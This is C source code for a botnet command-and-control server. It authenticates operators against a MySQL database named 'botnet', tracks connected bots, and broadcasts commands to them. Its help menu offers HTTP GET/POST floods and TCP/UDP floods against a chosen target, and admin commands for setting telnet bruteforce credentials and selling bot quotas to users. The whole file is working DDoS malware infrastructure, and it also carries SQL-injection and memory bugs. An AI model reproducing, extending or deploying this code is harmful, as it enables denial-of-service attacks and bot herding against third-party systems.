#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <unistd.h>
#include <ctype.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <glob.h>
#include <signal.h>
#include <mysql.h>
#include <my_global.h>
#include <arpa/inet.h>
#include <sys/epoll.h>
#include <sys/types.h>
#include <sys/socket.h>

/* general configuration */
#define MAXFDS 1000000
#define AUTH_TIMEOUT 10
#define EPOLL_TIMEOUT -1
#define PHI 0x9e3779b9

/* database configuration */
#define NAME "botnet"
#define SERVER "localhost"
#define USER "root"
#define PASSWORD "xxHacker1337++"

static volatile int epoll_fd = 0, listen_fd = 0, reflectors = 0;
static uint32_t x, y, z, w;
MYSQL *database;

struct clientdata_t
{
    uint32_t ip, authed_time;
    int fd, name_len;
    char connected, name[32];
    enum {
    	BOT,
    	ADMIN
    } type;
} clients[MAXFDS];

struct accountinfo_t
{
	int fd;
	int maxbots;
};

void clearnup_connection(struct clientdata_t *conn)
{
	if (conn->fd > 3)
	{
		close(conn->fd);
		conn->fd = 0;
	}

	conn->type = BOT;
	if (conn->name_len >= 1)
		memset(conn->name, 0, sizeof(conn->name));

	conn->name_len = 0;
	conn->ip = 0;
	conn->connected = 0;
}

void terminate(void)
{
	int i;
	for (i = 0; i < MAXFDS; i++)
		clearnup_connection(&clients[i]);

	mysql_close(database);
	perror(NULL);
}

void broadcast_command(char *sendbuf, int maxcount)
{
	int i, sentto;
	char sdbuf[1024];

	strcpy(sdbuf, sendbuf);
	strcat(sdbuf, " Q");

	for (i = 0; i < MAXFDS; i++)
	{
		if (clients[i].connected == 1 && clients[i].type != ADMIN)
		{
			if (sentto >= maxcount && maxcount != -1)
				break;

			send(clients[i].fd, sdbuf, strlen(sdbuf), MSG_NOSIGNAL);
		}
	}

	memset(sdbuf, 0, sizeof(sdbuf));
}

void ping_pong(void)
{
	int i;

	for (i = 0; i < MAXFDS; i++)
	{
		if (clients[i].connected == 1 && clients[i].type != ADMIN)
			send(clients[i].fd, "\x00\n", 2, MSG_NOSIGNAL);
	}
}

void *tab_title(void *arg)
{
	int botcount = 0, i;
	char title[128];
	struct accountinfo_t *accinfo;
	accinfo = (struct accountinfo_t *)arg;

	while (1)
	{
		for (i = 0; i < MAXFDS; i++)
		{
			if (clients[i].connected == 1 && clients[i].type != ADMIN)
				botcount++;
			else
				continue;
		}

		if (botcount >= accinfo->maxbots && accinfo->maxbots != -1)
			sprintf(title, "\033]0;%d Loaded\007", accinfo->maxbots);
		else
			sprintf(title, "\033]0;%d Loaded\007", botcount);

		write(accinfo->fd, title, strlen(title));
		botcount = 0;
		sleep(2);
	}

	pthread_exit(0);
}
int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
	int total = 0, got = 1;

	while (got == 1 && total < bufferSize && *(buffer + total - 1) != '\n')
	{
		got = read(fd, buffer + total, 1);
		total++;
	}

	return got;
}

void trim(char *str)
{
	int i, begin = 0, end = strlen(str) - 1;

    while (isspace(str[begin]))
    	begin++;

    while ((end >= begin) && isspace(str[end]))
    	end--;

    for (i = begin; i <= end; i++)
    	str[i - begin] = str[i];

    str[i - begin] = '\0';
}

int fd_set_blocking(int fd, int blocking)
{
    int flags = fcntl(fd, F_GETFL, 0);
    if (flags == -1)
        return 0;

    if (blocking)
        flags &= ~O_NONBLOCK;
    else
        flags |= O_NONBLOCK;

    return fcntl(fd, F_SETFL, flags) != -1;
}

int create_and_bind(char *port)
{
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int s, sfd;

	memset(&hints, 0, sizeof (struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo(NULL, port, &hints, &result);

    if (s != 0)
		return -1;

	for (rp = result; rp != NULL; rp = rp->ai_next)
	{
		sfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (sfd == -1)
			continue;

		int yes = 1;
		if (setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 )
			terminate();

		s = bind(sfd, rp->ai_addr, rp->ai_addrlen);
		if (s == 0)
			break;

		close(sfd);
	}

	if (rp == NULL)
		return -1;
	else
	{
		freeaddrinfo(result);
		return sfd;
	}
}

void *bot_event(void *arg)
{
	struct epoll_event event;
	struct epoll_event *events;

    events = calloc(MAXFDS, sizeof event);

    while (1)
    {
		int n, i;
		n = epoll_wait(epoll_fd, events, MAXFDS, EPOLL_TIMEOUT);

		for (i = 0; i < n; i++)
		{
			if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
			{
				printf("[Cnc] Client disconnected %d\n", events[i].data.fd);
				clearnup_connection(&clients[events[i].data.fd]);
				continue;
			}
			else if (listen_fd == events[i].data.fd)
			{
               	while (1)
               	{
               		int accept_fd, s;
               		uint32_t packet = htonl(11811);
					struct sockaddr in_addr;
	                socklen_t in_len = sizeof(in_addr);

					if ((accept_fd = accept(listen_fd, &in_addr, &in_len)) == -1)
					{
						if ((errno == EAGAIN) || (errno == EWOULDBLOCK))
							break;
                    	else
                    		terminate();
					}

					if ((s = fd_set_blocking(accept_fd, 0)) == -1)
					{
						close(accept_fd);
						break;
					}

					event.data.fd = accept_fd;
					event.events = EPOLLIN | EPOLLET;

					if ((s = epoll_ctl(epoll_fd, EPOLL_CTL_ADD, accept_fd, &event)) == -1)
					{
						terminate();
						break;
					}

					clients[event.data.fd].connected = 1;
					clients[event.data.fd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
					clients[event.data.fd].fd = event.data.fd;
					clients[event.data.fd].authed_time = time(NULL);

					printf("[Cnc] New Client Accepted %d\n", event.data.fd);
				}
				continue;
			}
			else
			{
				int end = 0, fd = events[i].data.fd;

				while (1)
				{
					char *buf = calloc(512, sizeof(char *));
					ssize_t count;

					while (memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, clients[fd].fd)) > 0 && clients[fd].type != ADMIN)
					{

					}

					if (count == -1)
					{
						if (errno != EAGAIN)
							end = 1;

						break;
					}
					else if (count == 0)
					{
						end = 1;
						break;
					}

					if (end == 1)
					{
						clearnup_connection(&clients[fd]);
					}
				}
			}
		}
	}
}

void *controller_thread(void *arg)
{
	char rdbuf[1024], username[32], password[32], query[1024], prompt[256];
	int myfd = *((int *)arg);
	ssize_t buflen;
	pthread_t thread;

	struct {
		int admin;
		int maxbots;
	} controller;

	MYSQL_RES *res;
	MYSQL_ROW row;

	write(myfd, "\033[?1049h\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", strlen("\033[?1049h") + 16);
	write(myfd, "Input correct credentials\n\033[01;32mUsername\033[00m: ", strlen("Input correct credentials\n\033[01;32mUsername\033[00m: "));
	read(myfd, username, sizeof(username));
	write(myfd, "\033[01;32mPassword\033[00m: ", strlen("\033[01;32mPassword\033[00m: "));
	read(myfd, password, sizeof(password));

	trim(username); username[strcspn(username, "\n")] = 0;
	trim(password); password[strcspn(password, "\n")] = 0;

	sprintf(query, "select password from logins where username='%s'", username);

	if (mysql_query(database, query) == 1)
	{
		memset(username, 0, sizeof(username));
		memset(password, 0, sizeof(password));
		pthread_exit(0);
	}
	else
	{
		memset(query, 0, sizeof(query));
		res = mysql_use_result(database);
		if ((row = mysql_fetch_row(res)) == NULL)
		{
			memset(username, 0, sizeof(username));
			memset(password, 0, sizeof(password));
			mysql_free_result(res);
			pthread_exit(0);
		}
	}

	if (strcmp(password, row[0]) != 0)
	{
		memset(username, 0, sizeof(username));
		memset(password, 0, sizeof(password));
		mysql_free_result(res);
		pthread_exit(0);
	}
	memset(query, 0, sizeof(query));
	mysql_free_result(res);

	sprintf(query, "select admin from logins where username='%s'", username);
	if (mysql_query(database, query) == 1)
		pthread_exit(0);
	else
	{
		memset(query, 0, sizeof(query));
		res = mysql_use_result(database);
		if ((row = mysql_fetch_row(res)) == NULL)
		{
			mysql_free_result(res);
			pthread_exit(0);
		}
	}

	controller.admin = atoi(row[0]);
	if (controller.admin != 0 && controller.admin != 1)
	{
		memset(query, 0, sizeof(query));
		mysql_free_result(res);
		pthread_exit(0);
	}
	memset(query, 0, sizeof(query));
	mysql_free_result(res);

	sprintf(query, "select botcount from logins where username='%s'", username);
	if (mysql_query(database, query) == 1)
		pthread_exit(0);
	else
	{
		memset(query, 0, sizeof(query));
		res = mysql_use_result(database);
		if ((row = mysql_fetch_row(res)) == NULL)
		{
			mysql_free_result(res);
			pthread_exit(0);
		}
	}

	controller.maxbots = atoi(row[0]);
	if (controller.maxbots != -1 && !controller.maxbots > 1)
	{
		memset(query, 0, sizeof(query));
		mysql_free_result(res);
		pthread_exit(0);
	}
	memset(query, 0, sizeof(query));
	mysql_free_result(res);

	if (controller.admin == 1)
		sprintf(prompt, "\033[01;32m%s@botnet\033[00m:\033[01;34m~/admin/\033[00m$ ", username);
	else
		sprintf(prompt, "\033[01;32m%s@botnet\033[00m:\033[01;34m~\033[00m$ ", username);

	write(myfd, prompt, strlen(prompt));

	struct accountinfo_t *accinfo;
	accinfo = (struct accountinfo_t *)malloc(sizeof(struct accountinfo_t *));
	accinfo->maxbots = controller.maxbots;
	accinfo->fd = myfd;
	pthread_create(&thread, NULL, &tab_title, (void *)accinfo);

	while (read(myfd, rdbuf, sizeof(rdbuf)) > 0)
	{
		trim(rdbuf);

		if (strlen(rdbuf) == 0 || strlen(rdbuf) <= 2)
		{
			write(myfd, prompt, strlen(prompt));
			memset(rdbuf, 0, sizeof(rdbuf));
			continue;
		}

		if (strcmp(rdbuf, "help") == 0 || strcmp(rdbuf, "?") == 0)
		{
			write(myfd, "\033[00mlayer 7 floods\n", strlen("\033[00mlayer 7 floods\n"));
			write(myfd, "\033[01;34mget <target> <workers> <time>\n", strlen("\033[01;34mget <target> <workers> <time>\n"));
			write(myfd, "\033[01;34mpost <target> <workers> <time>\n", strlen("\033[01;34mpost <target> <workers> <time>\n"));
			write(myfd, "\033[01;34mdata <target> <workers> <time> <data>\n", strlen("\033[01;34mdata <target> <workers> <time> <data>\n"));

			write(myfd, "\033[00mlayer4 floods\n", strlen("\033[00mlayer4 floods\n"));
			write(myfd, "\033[01;34mtcp <target> <port> <time>\n", strlen("\033[01;34mtcp <target> <port> <time>\n"));
			write(myfd, "\033[01;34mudp <target> <port> <time>\n", strlen("\033[01;34mtcp <target> <port> <time>\n"));
			if (controller.admin == 1)
			{
				write(myfd, "\033[00madmin commands\n", strlen("\n\033[00madmin commands\n"));
				write(myfd, "\033[01;34mtelnet <user> <pass> : update bruteforce credentials\n", strlen("\033[01;34mtelnet <user> <pass> : update bruteforce credentials\n"));
				write(myfd, "\033[01;34madduser : create a new user without admin privlages\n", strlen("\033[01;34madduser : create a new user without admin privlages\n"));
			}
		}
		else if ((strcmp(rdbuf, "adduser") == 0 || strcmp(rdbuf, "newuser") == 0) && controller.admin == 1)
		{
			char newuser[32], newpass[32], botcount[32];

			write(myfd, "\033[01;34mUsername of new user\033[00m: ", strlen("\033[01;34mUsername of new user\033[00m: "));
			read(myfd, newuser, sizeof(newuser));
			write(myfd, "\033[01;34mPassword of new user\033[00m: ", strlen("\033[01;34mPassword of new user\033[00m: "));
			read(myfd, newpass, sizeof(newpass));
			write(myfd, "\033[01;34mBotcount of new user (-1 = unlimited)\033[00m: ", strlen("\033[01;34mBotcount of new user (-1 = unlimited)\033[00m: "));
			read(myfd, botcount, sizeof(botcount));

			trim(newuser); username[strcspn(newuser, "\n")] = 0;
			trim(newpass); username[strcspn(newpass, "\n")] = 0;
			trim(botcount); username[strcspn(botcount, "\n")] = 0;

			sprintf(query, "INSERT INTO logins VALUES ('%s', '%s', '%s', '0');", newuser, newpass, botcount);

			if (mysql_query(database, query) == 1)
				write(myfd, "\e[91mFailed to add user to database\n", strlen("\e[91mFailed to add user to database\n"));
			else
				write(myfd, "\e[92mNew user added to database\n", strlen("\e[92mNew user added to database\n"));

			memset(newuser, 0, sizeof(newuser));
			memset(newpass, 0, sizeof(newpass));
			memset(botcount, 0, sizeof(botcount));
		}
		else if (rdbuf[0] == '!')
			broadcast_command(rdbuf + 1, controller.maxbots);

		write(myfd, prompt, strlen(prompt));
		memset(rdbuf, 0, sizeof(rdbuf));
	}

	memset(query, 0, sizeof(query));
	memset(username, 0, sizeof(username));
	memset(password, 0, sizeof(password));
	pthread_exit(0);
}

void *controller_listen(void *arg)
{
	int myfd = *((int *)arg), newfd;
	struct sockaddr in_addr;
	socklen_t in_len = sizeof(in_addr);

	if (listen(myfd, SOMAXCONN) == -1)
		pthread_exit(0);

	while (1)
	{
		if ((newfd = accept(myfd, &in_addr, &in_len)) == -1)
			break;

		pthread_t cthread;
		pthread_create(&cthread, NULL, &controller_thread, &newfd);
	}

	close(myfd);
	pthread_exit(0);
}

int main(int argc, char *argv[], void *sock)
{
	int s, threads;
    struct epoll_event event;

    if (argc != 4)
    {
    	printf("[Main] Usage: ./cnc <bot-port> <cnc-port> <threads>\n");
		exit(EXIT_FAILURE);
    }
    else
    {
    	threads = atoi(argv[3]);
    	if (threads < 10 || threads > 750)
    	{
	    	printf("[Main] You are using to much or to little threads 10-750 is the limit\n");
	    	terminate();
    	}
    }

    database = mysql_init(NULL);
    if (!mysql_real_connect(database, SERVER, USER, PASSWORD, NAME, 0, NULL, 0))
    {
    	printf("[Main] Failed to open the database\n");
    	terminate();
    }

    if ((listen_fd = create_and_bind(argv[1])) == -1)
    {
    	printf("[Main] Failed to bind bot worker\n");
    	terminate();
    }

    if ((s = fd_set_blocking(listen_fd, 0)) == -1)
    {
    	printf("[Main] Failed to set socket to non-blocking\n");
    	terminate();
    }

    if ((s = listen(listen_fd, SOMAXCONN)) == -1)
    {
    	printf("[Main] Failed to listen\n");
		terminate();
    }

    if ((epoll_fd = epoll_create1(0)) == -1)
    {
    	printf("[Main] Failed to epoll create\n");
		terminate();
    }

    event.data.fd = listen_fd;
    event.events = EPOLLIN | EPOLLET;

    if ((s = epoll_ctl(epoll_fd, EPOLL_CTL_ADD, listen_fd, &event)) == -1)
    {
    	printf("[Main] Failed to add listen to epoll\n");
		terminate();
    }

    pthread_t thread[threads + 2];
    while (threads--)
		pthread_create(&thread[threads + 1], NULL, &bot_event, (void *) NULL);

    if ((s = create_and_bind(argv[2])) == -1)
    {
    	printf("[Main] Failed to bind controller\n");
    	terminate();
    }
    pthread_create(&thread[0], NULL, &controller_listen, &s);

    while (1)
    {
    	ping_pong();
		sleep(5);
    }

    close(listen_fd);
    return EXIT_SUCCESS;
}
